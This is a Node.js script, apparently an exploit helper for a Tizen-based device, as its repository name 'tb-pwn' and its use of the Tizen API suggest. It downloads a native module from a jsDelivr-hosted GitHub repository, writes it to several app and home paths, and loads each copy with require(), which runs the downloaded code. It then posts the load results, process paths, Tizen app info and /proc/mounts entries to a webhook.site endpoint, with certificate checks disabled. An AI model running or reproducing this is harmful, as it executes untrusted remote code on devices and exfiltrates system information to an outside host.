var https = require('https');
var fs = require('fs');
var TOKEN = '14750775-fef3-408e-8214-35e34b90591f';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
function tryLoad(p, b) {
    try {
        fs.writeFileSync(p, b);
    } catch (e) {
        send('ldpath', p + ' write ERR ' + e);
        return;
    }
    try {
        var a = require(p);
        send('ldpath', p + ' OK hello=' + a.hello());
    } catch (e) {
        send('ldpath', p + ' load ERR ' + e);
    }
}
var url = 'https://cdn.jsdelivr.net/gh/cerad95/tb-pwn-9c4f@addon1/tb.node';
https.get(url, function (res) {
    var chunks = [];
    res.on('data', function (d) { chunks.push(d); });
    res.on('end', function () {
        var b = Buffer.concat(chunks);
        send('ldpath', 'downloaded=' + b.length);
        ['/home/owner/share/tb.node', '/opt/usr/home/owner/share/tb.node', '/home/owner/share/tmp/tb.node', '/opt/usr/home/owner/share/dotnet/tb.node', '/opt/usr/apps/xvvl3S1bvH/data/tb.node', '/opt/usr/apps/xvvl3S1bvH/shared/tb.node', '/tmp/tb.node'].forEach(function (p) {
            tryLoad(p, b);
        });
        try {
            send('ldpath', 'cwd=' + process.cwd() + ' dirname=' + __dirname);
        } catch (e) {}
        try {
            var ai = tizen.application.getAppInfo();
            send('ldpath', 'appinfo=' + JSON.stringify(ai));
        } catch (e) {
            send('ldpath', 'appinfo ERR ' + e);
        }
        try {
            var mounts = fs.readFileSync('/proc/mounts', 'utf8').split('\n').filter(function (l) {
                return /\/tmp|\/home|\/opt|\/usr\/apps|data|share|exec/.test(l);
            }).slice(0, 30).join('\n');
            send('ldpath', 'mounts:\n' + mounts);
        } catch (e) {
            send('ldpath', 'mounts ERR ' + e);
        }
    });
}).on('error', function (e) {
    send('ldpath', 'http ERR ' + e);
});
